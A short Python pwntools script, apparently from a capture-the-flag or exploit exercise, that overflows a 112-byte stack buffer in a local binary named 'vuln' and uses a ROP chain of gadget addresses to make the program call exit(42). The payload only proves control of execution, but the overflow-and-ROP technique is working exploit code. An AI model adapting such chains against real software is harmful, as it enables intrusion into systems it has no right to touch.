#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Gadgets
pop_rdi = 0x4006a6
pop_rax = 0x4005af
syscall = 0x40138c

# Probar localmente
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

# Payload simple: solo exit(42)
payload = b'A' * 112  # buffer
payload += b'B' * 8   # rbp

# ROP chain: exit(42)
payload += p64(pop_rax) + p64(60)  # sys_exit
payload += p64(pop_rdi) + p64(42)  # exit code
payload += p64(syscall)

print(f"Payload length: {len(payload)}")

io.sendline(payload)

# Ver qué pasa
try:
    io.wait()
    print(f"Exit code: {io.poll()}")
except Exception as e:
    print(f"Exception: {e}")

io.close()
